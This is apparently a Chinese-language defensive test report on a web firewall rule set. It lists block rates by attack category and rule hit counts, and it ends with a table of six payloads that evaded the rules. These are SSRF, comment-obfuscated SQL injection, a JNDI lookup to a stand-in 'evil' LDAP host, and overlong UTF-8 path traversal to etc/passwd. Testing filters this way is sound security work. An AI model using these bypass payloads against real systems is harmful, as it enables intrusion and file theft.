# BypassLab 对抗矩阵报告

- 样本总数：130（攻击 102 / 良性 28）
- 攻击拦截率：**94.1%**（96/102）
- 良性误报率：**0.0%**（0/28）
- 执行错误：0

## 分类拦截率

| 类别 | 拦截/总数 | 拦截率 |
|---|---|---|
| benign | 0/28 | 0% |
| deserialization | 12/13 | 92% |
| path-traversal | 10/11 | 91% |
| rce | 14/14 | 100% |
| scanner | 8/8 | 100% |
| sqli | 22/25 | 88% |
| ssrf | 12/13 | 92% |
| xss | 18/18 | 100% |

## 命中规则分布

| 规则 | 次数 |
|---|---|
| BL-SQLI-001 | 11 |
| BL-SSRF-001 | 11 |
| BL-RCE-001 | 9 |
| BL-SCAN-001 | 8 |
| BL-XSS-001 | 8 |
| BL-DESER-001 | 7 |
| BL-TRAV-001 | 7 |
| BL-XSS-002 | 7 |
| BL-TRAV-002 | 5 |
| BL-DESER-002 | 4 |
| BL-RCE-002 | 4 |
| BL-XSS-003 | 3 |
| SEM-sql:comment-stripped+sql:tautology | 3 |
| BL-SQLI-002 | 2 |
| BL-SQLI-003 | 2 |
| BL-SQLI-004 | 2 |
| SEM-sql:quoted-eq+sql:tautology | 2 |
| BL-DESER-003 | 1 |

## 绕过清单（6 条，W3 补规则的输入）

| 样本 | 类别 | 名称 | 载荷（截断） |
|---|---|---|---|
| W3-HARD-SSRF-003 | ssrf | IPv6 映射回环 | `url=http%3A%2F%2F%5B%3A%3Affff%3A127.0.0.1%5D%3A8080%2F` |
| W3-HARD-SQLI-001 | sqli | MySQL 版本注释 | `id=1%20/*!50000union*/%20select%201` |
| W3-HARD-SQLI-002 | sqli | 关键字中间插注释 | `id=1%20un/**/ion%20se/**/lect%201` |
| W3-HARD-SQLI-004 | sqli | 括号包裹恒真式 | `id=1%20and%20(1)=(1)` |
| W3-HARD-DESER-002 | deserialization | JNDI env 前缀绕过 | `${${env:FOO:-j}ndi:ldap://evil/a}` |
| W3-HARD-TRAV-001 | path-traversal | 超长 UTF-8 斜杠 | `f=..%c0%af..%c0%afetc%c0%afpasswd` |
